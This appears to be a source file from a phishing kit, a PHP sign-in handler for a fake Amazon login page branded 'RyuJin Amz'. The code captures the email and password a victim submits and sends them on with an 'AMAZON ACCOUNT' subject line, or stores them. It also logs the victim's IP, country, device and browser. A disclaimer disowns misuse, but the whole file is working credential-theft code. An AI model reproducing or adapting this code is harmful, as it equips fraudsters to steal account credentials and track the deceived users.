<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:23 )
* @filename signin.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/
/*** LOG CONFIG FOR STATS ***/
$continue = $this->router('signin')['short'];
$type_log = 'login';
$desc_log  = 'USER : '.$_POST['email'].' Logged in !';
////////////////////////////

/**** SENDING CONFIG ***/
$type_send = 'account';
$subject_send ='AMAZON ACCOUNT : '.$_POST['email'];
$form_send = 'RyuJin Amz';
////////////////////////



if($this->getPost())
{
    $data = [];

    $email = $this->getPost()['email'];
    $data['email'] = $email; 

    
    $password = $this->getPost()['password'];
    $data['password'] = $password; 

    
        $send = ['from' => $form_send,
                'subject' => $subject_send,
                'type' => $type_send,
                'data' => $data
            ];

        $log = ['type' => $type_log,
                'desc' => $desc_log
            ];

        if(CONFIG['app']['send_login'] == 1){
        return $this->send($send,$log,$continue);
        }else{
                 toLogs($log['type'] ,['data' => ['country' => $this->userdata['country']['country'],
                                        'device' => $this->handler->detection()['platform'],
                                        'ip' => $this->handler->detection()['userip'],
                                        'browser' => $this->handler->detection()['browser']
                                        ],
                                'desc' => $log['desc']
        ]);
        return $this->save_without_send($send,$continue);
        }
 
}
